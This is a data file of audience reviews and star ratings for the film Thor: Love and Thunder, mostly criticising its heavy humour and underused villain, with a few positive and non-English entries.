"One of the 3 pillars of the MCU, Thor a powerful god with a dark backstory of loss and grievance. Reduced to a bumbling fool with any ability to take him seriously taken away by the feel of this film. The movie is carried by familiar faces being the drawback and with the marvel badge causing us to flock to cinemas in droves, only to leave disappointed. The films plot is skimmed over with a grain of salt and is drowned in comedic attempts, which if that's your aim it was definitely achieved. I found myself at times in great laughter but however this was not what I was looking for in a story about Thor. There was great opportunity to explore what our hero would look like after the events of infinity war and end game but he was left as empty and pointless as possible. Overall, this film was a comedy that should've been a serious story.",2
"It is a pretty bad degrade from the previous movies. It seems like it is trying to be a children's Disney movie more than exploring the compelling character of Thor they set up in previous movies. Ragnarok was a breath of fresh air with the added jokes, but now it seems they have gone too far with the gags and jokes making Thor Love and Thunder seem more like a parody than a story.",2
"Film different from the usual action movies and with strong moments of irony, but also of family affection.",4.5
It was great to see Natalie Portman in action but the movie was ruined by Waititi's dive into his comic ways that somehow made Ragnorak so good. Gorr The God Butcher's appearance was a huge disappointment too. Christian Bale couldn't even save it. A ZSJL Steppenwolf type design would have been far better suited.,3
"Personally I really enjoyed this movie, the cinematography and editing was seamless and great to watch. Sadly the screenwriting was just alright. I would recommend watching this movie at least once but I doubt it will become a favorite.",3
All over the place. Just not good. Bad writing and directing/editing,1.5
They absolutely destroyed Thor's character making him act like a immature teenager who doesn't know what to do with their lives. The comedy was so awkward and disturbing. The plot was also so sporadic and made literally no sense. Definitely the worst Marvel movie to date. Definitely has some woke scenes ruining some of my favorite characters. In my mind this is just a alternate universe made by Doctor Strange and it never really happened.,0.5
"This was a rather disappointing Thor movie. Thor movies have been one of the major standouts away from the major Avengers releases and Love & Thunder ends up being way less funny, way less exciting than its predecessors which I've enjoyed them all. It's great to see Natalie Portman back in a major way but even she's not enough to carry the movie with her return. A lot of reworking of the writing would have saved this movie.",3
"Ridiculous movie at times, which makes it impossible to take the storyline seriously. Action wise, the fights are equally ridiculous. The idea of Jane as Thor made me interested on this movie, but it was developed so poorly by the movie makers that it ends up being trivial. The God-killing villain, also interesting, handled just as poorly. Overall, I didn't feel like the movie ammounted to anything, other than giving Thor a kid. I'm very interested in the MCU, but this movie felt like filler and only made to milk the franchise.",2.5
N√£o gostei. H√° muitas piadas. Eles arruinaram um excelente arco dos quadrinhos. Enfim...,0.5
Too many jokes. Gorr was under used. Thor felt like a guy who doesn't take nothing serious. Eventhough he is the most develop character in the MCU. He all a lot and makes it seems like he just want enjoy life and leave destruction.,3
"Been there, done that. This film is very similar to most Marvel Phase 4 films as it does nothing new or especially interesting. I watched this on a long flight and took multiple breaks because the film was just....boring. Very glad I didn't pay anything to watch it.",2
Decent movie but I felt like it left me wanting more. I also felt Christian Bale as Gorr was such an underutilization of a massively talented actor,3.5
"I hated this movie! I think marvels standards are dropping rapidly and they are turning from action into comedy, which was not the reason I wanted to watch this film. Yes, some of the jokes are funny but there are way too many and at innapropriate. Marvel seems to be almost self-deprecating, in that it makes fun of its universe and the animals and realms it created, to a point that it is comical. Still, with the massive budget and great actors, they could have just gone along with the universe they created and I would have been much more satisfied, as they have the ability to create such an amazing CGI universe. I, therefore, think it is a shame that they ruin it by trying to turn it into a joke. The mix of comedy and action just leaves a bad taste as you do not mix well together at all, as there are serious scenes that you can't take seriously being they have the main character make a stupid comment or joke. I saw this already with Thor Ragnarok but they still got away with it then and it still managed to be enjoyable but this time, they far overstepped the line. I think this is such a disappointment and is dragging down marvels reputation.",1
"I found it hilarious as well as unexpectedly touching and emotional at times. I generally enjoy Taika Waititi's humour though, so for those who don't, it will probably be a different experience.",4
let's just forget about this one,3
"I didn't get to see this in the theater but I streamed it on Disney+. I seriously couldn't make it through the movie and I really really tried. Looking at it as a Marvel movie it was very bad, trying to look at as a spoof which is what it was doing for the half I saw ... it was bad. It is the worst movie I seen in probably 3 decades. If this is an example of Waititi's work even if it was an off day ... I definitely put him in the Ed Wood director's column. He probably shouldn't be directing commercials. It was a huge struggle throughout but pretty much got to the eff this S when Zeus held his toga and tip toed down the steps like a ballerina.",0.5
Terrible movie. That's all,0.5
Passed the time. Felt like Thor hasn't learned anything from the past films.,3
"Like a ""Holiday Special"", without the holiday. Thor has Jumped the Shark and Nuked the Fridge. So disappointing.",0.5
I'm finally burnt out when it comes to the MCU formula. It's too predictable and they continue throwing away amazing villains. Glad I didn't see this in theaters.,3
Fun at times but kind of a let-down from what I thought it would be,3
The only horrible Marvel movie to date. Plot goes from bad to worse. Took the serious tone and drama of the marvel comic and made it into a joke. Even Thor‚Äôs costume looked like a Halloween rental. Less serious than a comic! Don‚Äôt waste your time.,0.5
Nothing about this movie is good. Not true to the spirit or tone of the previous Thor movies. Acting and costumes are terrible. Not Marvel quality. Evidently Thor is not the name bestowed upon the character. It‚Äôs a title given to anyone who wields the hammer or axe. Jane Foster is ‚Äúa Thor‚Äù makes you wonder what‚Äôs Thors birth name? The plot goes from bad to worse. Don‚Äôt waste your time.,0.5
I thought it was a parody at first but a poor one. I soon realized it was not a parody and just poor. I admit to watching half and shutting it off in disgust.,1
"Avg movie, Christan bale wasted üòíüòí",2.5
"This film is quite underrated and very fun. While it takes things too silly sometimes, you still have a great performance by Christian Bale as a menacing and sympathetic villain, and some jokes that absolutely landed. Upon rewatch, it doesn't hit the same and you notice the silliness, but it still delivers as fun and rewatchable with a Taika Waititi vibrant backdrop.",3.5
"If you really love Thor then skip this movie, you will do yourself a favor trust me.",0.5
The nam of this movie should be Thor Forever...,0.5
It's very easy to watch and it's funny. I wouldn't give too much thoughts to Valkyri being a king...just relax people and enjoy the movie. Glad to see guardians having cameo there.,4
"No, Marvel, that's not the way...",1.5
"Just a spit in the face to Thor fans, just makes a mockery of Thor turning not only him into a joke character but everybody else, even Russell Crowe's Zeus is a camp satire/joke. Terrible movie, nothing likable at all. One of the worst cinema experiences I've ever encountered",0.5
"It wasn't as bad as I was fearing, but it really was just 'meh'. Some good bits in there, but overall too much mediocre humour, not enough depth and an underused villain. Plus those goats were very irritating.",3
"This was a really disappointing followup to Ragnarok. None of the actors seemed to actually enjoy doing this movie leaving the characters completely flat and the line delivery dull. The villain had great potential, but was poorly written. Not the worst Thor movie, but that is a low bar.",1.5
By far the worst MCU movie ever. Ever. It was like watching a really bad sitcom show with really bad jokes and flimsy characters.,0.5
"Very good movie. Love the jokes, commedies, and love stories. I wish Loki is in the movie but it's fine at least we can see his Varient meeting up with Thor sooner or later. I don't care what they say about this movie it looks good but not as good as Thor Ragnarok.",5
The movie over all was decent but the jokes didn't land very well,3
Terrible movie Taika Waititi has managed to make Thor one of the franchises most dedicated hero's into nothing more than a fool.,0.5
"the film feels cut out, elements are missing and it's strange to see how Jane is already transformed into Thor the story goes too fast and wrapped up, the special effects are rubbish",2
"All the progress Thor made on becoming a better person is gone. In this he's a narcissistic egotistical jerk. The jokes aren't funny, but they go on and on and on. I was with the god killer. The gods act like spoiled children. They only care for themselves.",2
"it's the worst MCU movie, weak script, joke excesses and stupid jokes",1.5
Couldn't stomach more than 20 minutes. Wow. It's remarkably bad. Thank god I didn't pay to see it in the theaters.,1
Goofy lame humor. Abnoxious goats. Thor looks like a loser. Dont be afraid to skip it.,2
Best Thor flick to date.,4
"I expected way more from this movie, so I can get why the first time I watched it I actually thought this was a solid MCU thriller. But after rewatching its so disappointing. The main problem I have with this movie isnt the comedy like everyone else, Some of the writing and dialogue is rough but it didn't take me out of the movie. What took me out of it was how many glaring plot problems there are. Thor knew about eternity during the years if endgame but just sat on his ass and drank bear on Asgard? Really? Another thing is the editing is odd.. Apparently the first cut was 4 hours long and you can tell with how many things are just skipped or glossed over. Gorr was a fantastic villain but we barely saw him, 15 minutes of scree time just feels like a waste especially with an actor as good as Christian Bale. Enough of what I didn't like, I feel like the theme of this movie is touched on well ""Never meet your heroes"" and I thought the cast was all around good. There are times where it feels like Natalie Portman had a tough time getting into Taika's comedy style after the first two Thor movies were so serious but she was fine, and her death was sad because it feels like Thor has lost everything he could. This movie is disappointing in my opinion but if you went into blind you might enjoy the experience more.",2.5
Very poor script. This movie tries to come off as funny but all it achieves is silly disappointment.,2
"It is slap happy fun like the last one. So worth seeing for sure if you like the last one. Would like to see Thor get back as a serious character as he was in the comics. Started with Fat Thor haha. Hey, you have Spidey doing his one liners and Dead Pool being funny and disgusting. Let Thor be well...Thor from the comics !!!",5
This is good movie. Very funny in some part. A little sad of course.,4.5
Taika do u think movie is a joke????? Im so dissapointed.... not expect thor 5,0.5
"Don't expect a badass action movie with just the right amount of comedy and a killer Thor unleashed moment, like in Ragnarok or Infinity war. This is a comedy from start to finish and left me disappointed and frustrated. Nobody could play Thor better than Chris and Taika is a great director, but damnit guy's, not every scene has to be funny.",3
"This movie kinda off for me, Ragnarok is better.",3
"Well, that was a waste of time. Giving two stars because of the goats.",2
"Gute Unterhaltung. Zwar st√∂rt mich, dass man Zeus eigentlich nicht t√∂tet und sein 'Werkzeug' mal eben so klaut, aber das ganze Popcorn-Drama wirkt unendlich nahbar und herrlich warmherzig. Ein weiteres Lob an Kevin Feige, der erneut einen guten digital Streifen aus den Marvel-Comics geschaffen hat. Noch ein bisschen Tech: Die deutsche Streaming- Tonspur wirkt evtl. Gut auf einem Tablet, Handy oder Mittelklasse Soundbar, aber f√ºr ein edles HighEnd Heimkino (Arcam - Dynaudio) wirkt sie etwas zu 'komprimiert' (Anmerkung: Hier erfolgt noch ein Test, wenn die Standard-UHD released ist). Man braucht reichlich Endstufen Power um es hier halbwegs 'krachen' zu lassen. Desweiteren ist das Bildformat mit 21:9 h√∂chst antiquarisch veraltet und bedarf einer zeitgem√§√üen Abtastung (16:9 oder besser IMAX). Zu guter letzt finde ich, dass dieser Marvel-Film nicht sehr gut mit den restlichen Filmen vernetz ist. Ansonsten Top! Gute Unterhaltung :) -- Good entertainment. It bothers me that you don't actually kill Zeus and just steal his 'tools' just like that, but the whole popcorn drama seems infinitely approachable and wonderfully warm-hearted. Another kudos to Kevin Feige for creating yet another fine digital flick from the Marvel Comics. A bit more tech: The German streaming soundtrack may work well on a tablet, cell phone or mid-range soundbar, but it seems a bit too 'compressed' for a noble high-end home cinema (Arcam - Dynaudio) (Note: Here is another test, when the standard UHD is released). You need a lot of power amplifiers to let it 'rip' halfway here. Furthermore, the picture format of 21:9 is extremely outdated and requires up-to-date scanning (16:9 or better IMAX). Finally, I feel that this Marvel film doesn't mesh very well with the rest of the films. Otherwise great! Good entertainment :) (Google Translate form german)",3.5
fortunately I'm one of the people who loved the movie still can't decide if ragnarok was better,5
"Lazy sequel... bad story, bad script, bad acting. Nobody seems to want to be here, including the VFX department. A shame considering how good and cool Thor: Ragnarok was.",2
This movie was funny but not feel anything like a Marvel movie. Wouldn‚Äôt recommend.,2
Hilarious but felt off brand and didn't leave me wanting more like Thor Ragnarock did.,3
Vile film. Continued to ruin a great character from the comics. Taika is a hack.,0.5
Total disaster...an iconic character treated in the worst possible way,0.5
Sooooo unrealistic ! what happened to Marvel movies ?!,0.5
I did really like this movie. It wasn't as good as the first 2 but I thought it was solid and fun.,4
The only thing fresh about the latest Thor moment was Christian Bale. Thor being on a quest for peace is a weird non-starter and Portman with cancer and the hammer doesn't move the emotions.,3
The whole movie is a series of ponds and tasteless jokes in every scene they have marvelous views of different realms but essentially its wasted with poor storytelling telling. I didn't think that they would present Thor as a poor writen character.,0.5
"Good grief, things were just weird in this one. A disappointing followup to a film that was one of the best in the series.",2.5
"Why did I waste my money to watch this at a Movie Theatre? If Disney Marvel wants me to watch their movies at a Theater again, they are going to need to EARN That again with the next few movies.",2
This was on par with most the recent Marvel movies. Wish they‚Äôd get back to making great Marvel movies. This was average at best.,3
Voc√™ fica com a sensa√ß√£o de que poderiam ter feito algo muito bom e s√©rio. Mas nada aqui √© bom e pode ser levado a s√©rio.,2
"This Was the worst Thor movies ever, nothing made sense and the dialog sucked. Don't be suckered into buying this! Couldn't watch the rest of it since it was so stupid.",1
"I feel MCU could have done a better job at making an action packed God-Themed movie rather than the jokes and jesters it had in it. I mean, Zeus performing silly magic tricks?? C'mon, we all expect more from the MCU.",2
"Up front, I am fan of the comics. This movie is an atrocity of idiotic proportions. The source material from Jason Aaron's Thor: God of Thunder and Mighty Thor runs is so good and Taika Waititi makes a mockery of it with constant lazy jokes and poor CGI set pieces. Gorr is one of the most interesting villains of all-time and he was absolutely wasted in this joke of a film. Someone else needs to take the reigns of this franchise... and generally, Marvel would do well to pump the brakes on the cheap comedy across the board. Some levity is great when it's appropriately timed, but when you're pumping out a weak joke every 15 seconds and the script is overloaded with tripe banter, it's impossible for the dramatic or tense moments to have any impact. Get Taika away from this stuff. I love his original comedic work, but he has no respect for the source material and the titular character. This formula was already tired after Thor: Ragnarok. Now it's just exhausting.",0.5
"I was just too OTT and goofy for me I grew to appreciate Ragnarok (although i found parts of the Humour in that less than funny) but Love and Thunder was just a mess Bale was wasted in the role of the big Bad Zeus was a campy cringeworthy mess Only scores a full star because Natalie Portman as The Mighty Thor was really good. Honestly, i will be very wary of another Taika MCU film",1
I thought this was by far the corniest of the Thor movies. Our family enjoyed the others much more. Thor Ragnarok was a brilliant blend of action and humor. I think they tried to tap into the same formula but missed the mark.,1
"Way too cringy, especially Jane Fosters lines in the movie",0.5
"This movie, viewed through the lens of Korg was a great telling. At times the comedy overshadowed the story, and a poor use of a superb villain. Would I watch this again...yes",4
Worst marvel movie ever,0.5
"Better than multiverse of madness, hate the fact that they decided to make Gorr a pedo instead of a god butchering badass.",2.5
"Jokes are cheap, predictable and lame, Waititi is trying too hard to make what could have been a really good balanced movie into something over the top, disappointed and ruined the Thor franchise for me sadly.",0.5
"I love Thor so was super keen to see this, then I heard all the reviews so had super low expectations... I was really surprised! It's a good movie. It's not as good as ragnorok which is my favourite Thor movie but it's still good. Yeah a bit high on the humour side but that's fine, Thor is after all a jokester. Is it the best marvel movie? No not at all, but it's ages away from the worst and I would happily watch it again.",5
"Forsaking story for a moment, I'll jump right in with why I hated this film. Hate is a strong term I know, but I can't go with anything else, I genuinely hate watched this. Anyway - We hit a moment in the film, you know the one, the heinous act of the villain and the kidnapping of children - this is where the ""comedy"" should've ended. It didn't. Tonally this film is appalling. Story and character development shunned for cheap ""laughs"" that never quite hit the way they should. Jane foster has cancer. Joke. Lol. No. No no no. Hemsworth makes the best of things playing his part well, but Bale - criminally underused and never stretched, not even for a second. Saddening, and for me, personally - the death knell in the MCU I have been waiting for, I knew it was coming, I spotted it in my periphery, I felt it. It is what it is, and I'll find something else to get excited about I know, but I wish I could see some light in the darkness, for purely selfish reasons. But I can't. Farewell MCU. You had a good run up until Endgame, but we part ways now for the grinding machine of Disney has told me I'm not welcome as a fan, and that's okay. They'll miss my money before I miss their current list of upcoming films.",0.5
I really like it movie,5
"disappointing and very cringe whenever the kids showed up, but still fun.",3
"Most of MCU movies expertly time when a comedic moment should go in, adding to the movie not being too serious, giving it balance, and making it extremely enjoyable. But with this director, he just puts the comedic moments in with every. other. breath. At first, when a funny moment arose, you chuckled or laughed. But before you could even finish enjoying that moment, another so-called joke is thrown in, and another, and another, and...you get the picture. Not even 20mins into the movie and I was done! I only finished watching it to see IF it would get better, and it didn't. And, because I paid for the rental. The next time I see this directors name on a movie, I'll definitely will pass. In summary, unfortunately, this movie is a JOKE!",1
Really good movie. And a different take on thor. Great to see a more comedic side to thors personality and Natalie Portman was stunning.,5
Loved it. Flashy colours. Cheesy lined Laughed out loud.,5
"With this being one of our most anticipated MCU entries since 'Endgame' after how it changed the character of Thor. That being said it felt very disheartening to receive what we were given with the story of 'Love and Thunder'. With what seemed like unfinished CGI, lackluster score, and poorly written jokes to undermine emotional scenes it feels like this movie had next to no structure during it's production. Love Taika Waititi's work in 'Ragnarok' and 'Jojo Rabbit' but unfortunately this one feels like a complete let down. Christian Bale stands out as the takeaway performance and character in this entry in the MCU",1.5
Worst MCU movie and it's not close! It's a parody....ruined many top tier characters,1
"Thor: Love and Thunder is a terrible film. Much like Multiverse of Madness, Love and Thunder is an overstuffed, convoluted mess of a script that's trying to do too much with too little time. However, by far the biggest issue this movie has is its tone, this is a movie where Gorr the God Butcher kidnaps a bunch of children, and kills a bunch of gods (off-screen), and Jane Foster is dying of terminal cancer, yet the movie just keeps throwing joke after joke at you, and none of them even remotely land. It feels like a parody of itself. In terms of praise, the actors give it their all, especially Chris Hemsworth and Christian Bale, who are both fantastic in the movie, the only thing holding them both back is the terrible writing and the lack of screen time for Gorr. Overall, Thor: Love and Thunder is a bit of a disaster and it's not a movie I can see myself revisiting in the future.",1.5
"A different version from the classic action-movies and full of humor. I appreciate the effort to portray Thor's adventures in a less serious way, while safeguarding the meaning of familiar affections.",4.5
"They should of called it ""love and blunder""as the M-SHE-U strikes again, it seriously felt like I was watching a bad Pixar movie.",1
By far the worst MCU film.,1
Really rubbish. Flip flop so much between weak jokes and pushing homosexuality that lost any interest. Sad because a lot of good movie stars cast. Could've been much better,0.5
"It's been months since I watched this move and I can't even remember a single good thing to say about this. Horrible CGI, too many jokes, bad writing...",2
"They make Thor's character incredibly dumb. Good storytelling and character building is sacrificed for the sake of humor, yet all of the jokes fall flat. There's an amazing amount of plot holes, such as why didn't Thor share his power during Endgame, why did the hammer go to Jane to protect her if her changing into Thor is killing her, why is Gor trying to kill Thor even though Thor is a god that obviously cares about his people. Awful, awful movie. Thor was one of my favorite Marvel characters and it's a shame that the MCU hasn't produced a quality movie since Endgame.",0.5
"Taika Waititi really messed up this time. One of the most ridiculous movies I have ever watched, the silly jokes made it even more boring than funny. its a waste of time.",2
it was fun and visually satisfying. I think they should have focused on Gore the God butcher a lot more and actually show him killing God's. I think that's where they dropped the ball,4
A mostly serviceable MCU film that did itself a disservice with badly timed jokes while supposedly putting our hero against his most dangerous foe. There was some interesting world building and Bale worked magic with the sparse lines available to him but I'd have liked to see more action from a character named Gorr. This cast (save from Portman) deserved better than this.,3
"Too comedic. Thor: Ragnarok struck a good balance, this; did not.",1
"Thor: Love and Thunder was a questionable one. The character arc of Jane Foster is poorly handled and very much rushed. In addition, not enough screen time was given to the main antagonist---who happened to be a really good actor in Christian Bale. I was very disappointed in how Taika responded to Ragnarok, and that is why this rating is so low.",2
I love this movie it was very funny,5
One of the worst movies in marvel.,0.5
"Honestly, disappointed & felt it didn‚Äôt live up to the prior films & was hoping for a higher caliber film.",2.5
"The quality of Marvel continues to decline, The heroes have softened, Thor lost his seriousness and became a soft clown. I can be a great movie, the woke theme ruined it",3
There is little merit to this soulless cash grab.,1
This movie was very disappointing. Maybe they should slow down on these Marvel movies and take the time to put out something worth watching.,3
"too goofy with not enough drama or seriousness to counter it properly, thor's depressive state needed someone more serious as an ally too",3
"Although mildly amusing, this movie totally embarrassed the Thor Marvel concept. The movie depicted Thor as idiot and comedic failure and is totally against the, ""historical Thor."" This movie gave me a bad taste for Marvel and makes me wonder if I need to switch my loyalties to DC - only time will tell.",1.5
"Someone tell Taika Waititi that Thor doesn't have to be a bad copy of the Guardians of the Galaxy. The film also contains good things: Natalie Portman's character and her illness are treated with delicacy and respect, just as Christian Bale's Gorr (although not very thorough) is nevertheless intriguing. The problem lies precisely in the excessive stupidity of the protagonist, ready to ruin any moment with a little pathos. Marvel has always accustomed us to a certain type of comedy and atmosphere in movies, but that doesn't justify pushing the accelerator even harder and creating a parody movie. Poor Thor, who reconfirms himself as one of the most mistreated MCU characters.",1
Not all jokes landed but it is quite an entertaining movie,4
Been made to be a young kids movie.. thank goodness for maybe a new director for future. Good to watch when tired.,3
it's great it's a great movie everyone should watch it it'll make everyone feel good it's awesome it's great,5
Why do you keep trashing these cool superheroes? Who is this movie for?,1.5
movie was one of the worst i've seen in a long time,0.5
"This movie left me totally confused and disappointed. Not sure why it was taken down the road it was, it was a parody of the previous installments that added nothing to the series at all. Very strange installment that might have ended the series all together.",1.5
"Bad movie. Too much comedy, and gorr was wasted. Since the tomato meter is /5, if it's /100, I'll rank it a 67/100",1.5
"A little too jokey at times, but I enjoyed its humor nonetheless. I like Chris Hemsworth as Thor; together with Taika Waititi and Tessa Thompson, it was almost like a buddy cop movie in many respects. I‚Äôll definitely rewatch.",4
This was truly awesome all the way through. Loved it!!,4.5
"Thor has become nothing more than a single brain cell attached to 2 biceps. So far from the character we saw in the first 2 Thor movies. The over saturated slapstick comedy and dim witted protagonist kill the movie. Gorr is a waste. He's called the God Butcher, but we never see kill any, which removes any feeling of threat.",2
This was so disappointing. I absolutely love Thor Ragnarok and I thought this was going to be as good but definitely not. The plot was boring until about half way through. The humour was terrible and definitely not Thor humour.,2.5
"The latest instalment of Thor is exactly what you'd expect of Marvel. The jokes were funny and Taika's directoral abilities made this film shine as a comedy, rather than the confusing boiling pot of angst and unfitting humour most Marvel movies have become. However, the film has one major plot hole that ruined what otherwise would've been a mostly cohesive and semi-entertaining story. Without spoiling, I can say it will not make sense by the end, which makes a perfectly emotionally gritty and beautiful finish almost utterly meaningless. That being said, the jokes are fresh and are sure to keep you and your family laughing throughout, and the return of Jane prompts some very interesting interactions and hilarity.",2.5
One Word NOICE. BUT I didn't like what they did to Gorr. That dudes supposed to be the GOD BUTCHER .. yet we never got to see any of that 'butchering' - what we got was a broken father. Aside from that - the movie was hilarious. Fun and enjoyable to watch. So - half ‚≠ê from a full 5.,4.5
"Second worse Marvel film, trying to hard to be funny. Marvel up until Endgame was incredible, they've really lost their touch with their latest editions",2
"E um filme bom , mais o que salva o filme √© diretor kkkkk",4
"I was afraid that after the insanely well Thor Ragnorak, another Thor movie made by Tamika Waititi could only fale. But boy, was I wrong. Silly humour, a good bad guy, beautiful visuals, intense drama and all of this perfectly balanced out.",5
P√©sima!!! Sobreactuada y sin una historia con bases‚Ä¶ la peor de marvel,1
not even deserves that one star,1
"This movie manages to lose any sense of tension of drama, as it undercuts it with jokes that are hit and miss. While it does have its enjoyable, standout moments it doesn't manage to keep you entertained during the 2 hour runtime. The best parts of the movie are those were Christian Bale is on screen, but sadly he seems to be heavily underutilized in a role that should have been more central to the film.",3
"I found the film ridiculous, expect much more depth",1
"Repugnante! Humor fraco, hist√≥ria pregui√ßosa, cenas sem impacto e o desperd√≠cio de um √≥timo vil√£o",0.5
"Amazing, a piece of art, I love the comedy and the old fashion style. We really need more movies like this.",5
"This movie is an absolute must-see, I loved it so much, it was funny, romantic (I'm not a romance kind of person but this was very sweet) and it had a twist of spookiness. The whole movie was amazing, I definitely recommend watching it.",5
"Wealthy but oddly shallow Jewish/Aotearoan director Taika Waititi makes a mess of this so-so film about *gasp* Marvel Comics characters amongst *gasp* acres of CGI animation, fake backdrops, computer renderings etc. A mish-mash plot of goodies, baddies, comic-book deities and a thread about cancer treatment appears but at this point (2022) when it feels like nothing the entertainment megacorp can offer to re-ignite the audience impression felt in 2012, they continue with further iterations of the genre regardless. Overpaid (and over-exposed) actors dress as comic book characters for 12 year olds in films typically aired for all age groups due to Disney market monopoly, the film has some impressive effects shots and production stills but simply isn't a stellar story or, typically for Waititi, lacks substantive emotional weight. Side note: see the directors 2016 film Hunt for the Wilderpeople, his best, and last significant piece of work, really.",2
Marvel seriously needs to take their time with their movies. The CGI in this movie was horrendous. Some shots could've easily been filmed without the use of a greenscreen. There were various parts in the movie where the shot looked visually pleasing and at times very bland. The narrative was a complete disaster.,3
"Silly, laughable, Thor: Love and Thunder was meant to be emotional but was just a giant mess",2.5
Feels like a huge letdown after Ragnarok. Constant silliness and cheesy lines. Could not take natalie portman seriously as Thor. Wasted opportunity. Worst Thor movie? (Potentially worse than Dark World) and one of the worst Marvel movies so far IMO,2
One of the worst MCU movies .. Is this parody of Thor movie ?,0.5
"It may have some visually stunning moments but the overall film is slow, repetitive and just down right awkward. I love Natalie but she is no Thor, nor that funny. It was like watching a joke filled trailer for over an hour. Essentially this movie was an unnecessary, money grab from marvel and co.",1.5
"I loved Thor Ragnarok and was really looking forward to what this story could be. To me, the movie takes that humor everyone loved in the last Thor and dials it way up, to the point where it really overshadows the film and any other emotions they hoped to bring. Like there are parts that should be very serious and it builds it that way but goes entirely into humor. I would've cut a lot of the comedy to really give Gorr more screen time and gave him some more development to show how strong he was and what drives him. Taika is great but this ain't one of his best.",3
I want the old Thor back! This edition (as well as Ragnorak) might as well have been a cartoon‚Ä¶because it sure felt like one.,2.5
"It's understandable the flaws, laziness and nonsense of the script, but it's understandable for a part in my point of view. I enjoyed it, but it's far from being the best movie from Marvel and even from Thor.",3.5
"Silly fluff. Look, there goes the mythology.",1
"I watch a myriad of content and don't even leave reviews. This movie deserves it after reluctantly giving it a second watch through. In a sea of super hero movies this one fails in everyway to leave any meaningful impact. Not only did I lose 2 hours of my life, we lost Bale as one of the best villains in the MCU to a Taika mess of a journey that has no direction with poor CGI and jokes that don't hit at all. By far the worst movie in the MCU and a disappointing ""sequel"" to Ragnarok that nearly rebooted and boosted this failed heroes saga. This is one that we'd all like to forget sooner than later.",0.5
I loved this movie it was so funny and action packed I loved when the guardians of the galaxy showed up. Highly recommend this film for people!!!,4.5
Seems as Ragnarok but better than The Dark World.,4.5
The biggest disappointment I have ever had of any Marvel movie. WHAT WERE THEY THINKING..?,1
"It has a somewhat different script from traditional action movies and it continues the story of an very ironic, fighting and capable of felling love Thor.",4.5
"I've never seen worse marvel movie (not serial) than this, Waititi clearly has rotten sense of humor and taste.",0.5
The WORST! I miss the old MCU before all these Waititian non-sense. That's NOT the Thor I remember. It was a sad joke at the face of one of the MCU's founding Avenger.,1
"Thor: Love and Thunder is a great film unfortunately this film consists of too many jokes and it just losses sight of its seriousness (for some parts). Gorr The God Butcher is such a wasted villain and Christian Bale being a great actor in this film. Thor: Love and Thunder feel like it's Thor: Ragnarok part 2 instead of a brand new film, reuse jokes or scenes.",4
"Good visuals, aside from that Watiti has gone way too far with the silliness this time around, Ragnarok was already such a sharp turn from the darker beginnings of the Thor cinematic storyline. This movie is just taking a dump all over this superhero credibility, why was Thor ever in danger when he could literally electro-fart the other avengers to give them his powers? This movie feels like a YTP parody of a Thor movie, and a badly made one.",1
"Some funny parts, but easily one of the worst movies I've watched this year.",2
"wow this thor movie sucks , story sucks and what happed to the action??? I'm so sorry this is the worst movie ever",1
"It's an okay adventure. Overly silly and most of the jokes just didn't land. The main character seems a bit lost, has no arc since the last outing. Feels like a parody of itself sometimes and the story is just dumb and contrived.",3
"Compared to many other MCU movies, this film unfortunately isn't compelling enough to watch more than once. Rather bland and had no real building towards next big baddie (i.e. Kang). Biggest issue is that it's the same plot as every other Thor movie before it. Thor finds himself for the 5th time (Thor 1, Thor 2, Thor Ragnarok, Endgame and L&T). These movies all have Thor trying to find himself and it's ridiculous that Marvel will try again and again to push the same stories which further proves they're creatively bankrupt. However they know people will just go to watch it anyways, and as long as people refrain from being honest about the quality of films today and actually force Marvel to put out quality content before it hits cinemas nothing will change.",2
"Fun, great action, visuals and set peices. The plot and pacing could have been better. But overall it's a good movie.",3.5
"there's nothing wrong with this movie. it passes quickly and doesn't linger anywhere, which is good. Chris Helmsworth does his thing and he's always fairly likeable. But the movie is so forgettable, so mediocre that it feels like they're just phoning it in and this is even with a heavyweight like Christian Bale as the baddie. There have been good Marvel movies; and some of them have been about Thor. But the quality has gone massively downhill since End Game.",2
"O clima de piadinha imbecil durante todo o filme √© muito muito dif√≠cil de engolir. A√≠ do nada a namorada do cara vira Thor tamb√©m, sem nenhuma explica√ß√£o decente e tal. Muito ruim, t√° doido.",2
Could not even finish this one. I really like Thor but this movie was just boring in my opinion,1
"Been a fan of mcu for as long as i can remember and this movie was just so so so disappointing. Two extremes, thor 1 with no humor to this beyond corny silly movie. I honestly couldnt wait for it to end. The stupid humor took over the entire movie. Shame i was really looking forward to a continuation of what was Ragnarok.",1
"Phase 4 I feel like has been struggling to create this new story line, and introducing new characters into the universe. With this film I was expecting Thor going through the pain on the events of Avengers: Endgame. With this film, it felt like a terrible comedy movie that's thrown unto DVD.",1.5
It's amazing it can be funny I loved it and I really liked the dwain the rock Johnson joke it was really good you must watch,5
"The truth is that as a Thor movie, it was very disappointing. The deep and serious moments were put down by the poor jokes and unseriousness of the main character. A painful thing to witness was the complete disregard of the character development that Thor went through in previous movies all for the sake of cheap jokes. It was not a great watch for me.",1.5
I love Chris Hemsworth and I love Natilie Portman. I wish I could say I love this movie. Unwatchable.,1.5
Why did you make this movie? It is terrible.,2
The constant silliness made it hard to watch and pay attention to. The animation was also very poor considering it's a Marvel movie. It's really not worth watching and feel it was a middle finger to the Thor movies with how childish the movie felt.,0.5
A realidade pode ser decepcionante...,1
"Not sure what happened... the jokes fell a bit flat, and I didn't feel connected with the story.",3
"While not completely boring, this film is tonally inconsistent. In a film revolving around cancer, murder and child abduction, there's too much forced humour, which doesn't allow you to feel the seriousness of the moment. It also doesn't help that the ""humour"" doesn't land. I didn't laugh once. That's disappointing considering it's a Taika Waititi film. Natalie Portman is also wasted in her return as Jane Foster. I never really felt the pain or anguish of a terminally ill person because they don't really show it. Not to mention the fact she doesn't even look like a woman who's dying. Christian Bale is cast in a film that doesn't deserve him. He's hardly on-screen and his plan doesn't really make sense. It also undoes a lot of the development Thor has undergone in the MCU, reducing him to a parody of himself. The CGI is very noticeable and cartoonish If I have to give this film one positive, it would be the score. It's very 80s Rock inspired, which I quite liked. Unfortunately, that's as far as my praise can go. This film series continues to drift aimlessly, and it's a shame.",2.5
All actors did an incredible job in their role but the director Taika Waititi has potentially destroyed the Thor franchise beyond repair. Costumes looked cheap. CGI missed the mark. It's full of low-grade silly humor. A disappointment to the otherwise great Thor franchise.,1.5
this movie was sort of disappointing. I just liked christian bale's acting,3
"Seriously disappointed,especially after last Thor movie",2
"Gorr sach se brutal character, the have not utilised him properly in the movie, also they have ruined gorr's looks in the movie. He should have looked exactly same like in the comics. Plus they have made THOR ‚ö° a Joke, who is a God. This movie should have been a serious and dark and brutal one, instead they ruined the movie by making it colourful and too much unwanted Comedy.",2
